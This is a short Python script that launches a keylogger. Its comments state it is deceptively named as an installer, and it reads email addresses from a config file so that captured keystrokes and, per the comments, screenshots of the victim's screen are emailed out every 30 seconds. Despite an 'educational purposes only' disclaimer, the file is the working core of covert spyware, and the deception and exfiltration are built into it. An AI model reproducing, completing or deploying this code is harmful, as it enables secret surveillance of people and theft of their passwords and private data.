# disclaimer - this program is for educational purposes only
#   any use of this program for malicious reasons falls completly under your risk
#   and I will take no fault for your actions.

# this file is named installer for deceptive reasons
# It will act like an "installation" script 

# functionality:
# - sends screenshot of the persons screen every 30 seconds
# - key strokes are logged to a file. File is sent every 30 seconds?


# format.txt -
# first line: <sender-emial>
# second line: <recepient-email>

from keylogger import KeyLogger # import class we created
from myemail import Email

def main():
    """
    Main "installation" function used to install program
    """
    # create the email from formatter, and close it
    f = open("format.txt")
    my_email = f.readline().rstrip('\n')
    to_email = f.readline().rstrip('\n')
    f.close()

    # run the logger
    email = Email(my_email, to_email)
    kl = KeyLogger(email) # add arguments to adjust email and log time
    kl.run_keylogger()

   


# check to see if main script being run
if __name__== "__main__":
    main()

